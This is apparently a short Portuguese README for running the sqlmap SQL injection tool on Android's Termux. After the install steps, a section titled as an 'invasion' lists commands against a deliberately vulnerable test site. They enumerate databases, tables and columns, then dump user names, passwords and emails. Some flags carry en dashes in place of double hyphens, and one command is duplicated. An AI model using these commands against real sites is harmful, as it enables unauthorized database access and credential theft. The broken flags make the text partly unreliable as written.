# sqlmap-termux
##
ATUALIZE SEU REPOSITORIO.
##
$ pkg update && pkg upgrade -y 
##
INSTALE OS SEGUINTES PACOTES:
##
$ pkg install python 
$ pkg install python2
$ pkg install git 
##
BAIXE O SCRIPT 
##
$ git clone https://github.com/sqlmapproject/sqlmap
##
ESCOLHA O DIRETÓRIO DO SQL:
##
$ cd sqlmap
##
COMANDO DE EXECUÇÃO PARA ABRIR O SQLMAP:
##
$ python2 sqlmap.py 
##
EFETUAR INVAÇÃO 
##
EX:

$ python2 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs

$ python2 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart –tables

$ python2 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users –columns

$ python2 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users –columns

$ python2 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php? -D acuart -T users -C name,pass,uname,email –dump





